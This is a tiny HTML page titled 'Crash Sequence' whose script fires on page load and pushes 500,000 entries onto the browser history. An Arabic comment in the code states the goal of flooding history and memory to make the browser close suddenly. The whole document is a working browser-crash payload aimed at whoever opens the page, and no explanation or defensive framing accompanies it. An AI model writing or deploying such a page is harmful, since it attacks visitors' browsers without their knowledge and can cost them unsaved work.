<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Crash Sequence</title>
  <script>
    window.onload = function() {
      // إغراق سجل المتصفح والذاكرة في تكرار سريع للتسبب في إغلاق مفاجئ
      for (let i = 0; i < 500000; i++) {
        history.pushState(0, 0, i.toString());
      }
    };
  </script>
</head>
<body>
  <h2>Crash Sequence Running...</h2>
</body>
</html>
